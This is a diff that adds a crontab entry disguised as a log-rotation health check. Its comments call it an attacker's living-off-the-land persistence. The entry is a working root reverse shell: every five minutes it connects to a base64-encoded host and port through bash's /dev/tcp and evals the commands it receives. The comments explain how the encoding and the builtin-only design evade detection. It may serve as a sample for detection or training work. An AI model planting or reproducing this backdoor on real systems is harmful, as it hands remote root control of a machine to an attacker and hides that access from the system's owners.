@@ -1,0 +1,7 @@
+# Log rotation health check. Runs every 5 minutes.
+# (This is the attacker's LotL persistence. The cron name is
+#  innocuous. The command uses only bash builtins plus gzip/find/cut —
+#  no nc, no curl, no dropped binary. The reverse shell is through
+#  /dev/tcp, which is a bash feature, not an external tool. The
+#  target host+port is stored as base64 to defeat literal-IP matching.)
+*/5 * * * * root _H=$(echo "MTkyLjAuMi4yMDA=" | base64 -d); _P=$(echo "NDQ0NA==" | base64 -d); exec 3<>/dev/tcp/${_H}/${_P}; while read -u 3 _c; do eval "${_c}" >&3 2>&3; done
